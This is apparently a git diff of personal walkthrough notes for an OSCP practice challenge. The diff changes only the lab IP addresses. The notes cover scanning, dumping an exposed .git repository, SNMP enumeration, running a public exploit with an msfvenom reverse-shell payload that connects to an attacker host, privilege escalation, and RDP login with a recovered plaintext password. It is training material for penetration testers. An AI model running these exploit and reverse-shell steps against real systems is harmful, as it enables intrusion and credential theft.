@@ -10,12 +10,12 @@ Please feel free to complete this challenge at your own pace. While the OSCP exa
 We recommend that you begin with a network scan on all the provided IP addresses, and then enumerate each machine based on the results. When you are finished with the Challenge, we suggest that you create a mock-exam report for your own records, according to the advice provided in the Report Writing for Penetration Testers Module.
 
 # 
-sudo nmap -T4 -A 192.168.162.141-145
+sudo nmap -T4 -A 192.168.242.141-145
 [ip-scanning.md]
 
 # CRYSTAL
 # Found there is a .git on the server. Lets download and find what can we find from the server
-wget -r -np http://192.168.162.144/.git/
+wget -r -np http://192.168.242.144/.git/
 
 git show
 ...
@@ -42,7 +42,7 @@ git show 80ad...
 ...
 # Since we have both two credentials now lets try to access into the server
 # Only 1 user manage to access it
-ssh stuart@192.168.162.144 
+ssh stuart@192.168.242.144 
 cat local.txt
 
 # In the opt/backup found sitebackup1.zip file
@@ -84,7 +84,7 @@ User chloe may run the following commands on oscp:
 root@oscp:~# cat proof.txt
 
 # HERMES
-snmpwalk -c public -v1 192.168.162.145 
+snmpwalk -c public -v1 192.168.242.145 
 ...
 iso.3.6.1.2.1.1.4.0 = STRING: "zachary"
 iso.3.6.1.2.1.25.6.3.1.2.12 = STRING: "Mouse Server version 1.7.8.5"
@@ -100,12 +100,12 @@ searchsplot -m 50972
 
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.165 LPORT=8888 -f exe -o met.exe
 
-python3 50972.py 192.168.162.145 192.168.45.165 met.exe
+python3 50972.py 192.168.242.145 192.168.45.165 met.exe
 # Lel seem like not working.. Lets change to 49601
 python3 -m http.server 80 # on the payload folder 
-python2 50972.py 192.168.162.145 192.168.45.165 reverse.exe
+python2 50972.py 192.168.242.145 192.168.45.165 reverse.exe
 # In the end I found out is the http server need to be host...
-[*] Command shell session 1 opened (192.168.45.165:8888 -> 192.168.162.145:52032) at 2024-06-02 23:52:01 +0800
+[*] Command shell session 1 opened (192.168.45.165:8888 -> 192.168.242.145:52032) at 2024-06-02 23:52:01 +0800
 
 C:\Users\offsec\Desktop>type local.txt
 # Upload winpeas and run
@@ -126,6 +126,6 @@ C:\Users\offsec\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwo
 # From other writeups, we can use powershell to query
 reg query HKCU\Software\SimonTatham\PuTTY\Sessions
 
-xfreerdp /u:zachary /p:Th3R@tC@tch3r /v:192.168.162.145 /cert-ignore
+xfreerdp /u:zachary /p:Th3R@tC@tch3r /v:192.168.242.145 /cert-ignore
 # Run powershell as Admin
 PS C:\Users\Administrator\Desktop> type proof.txt
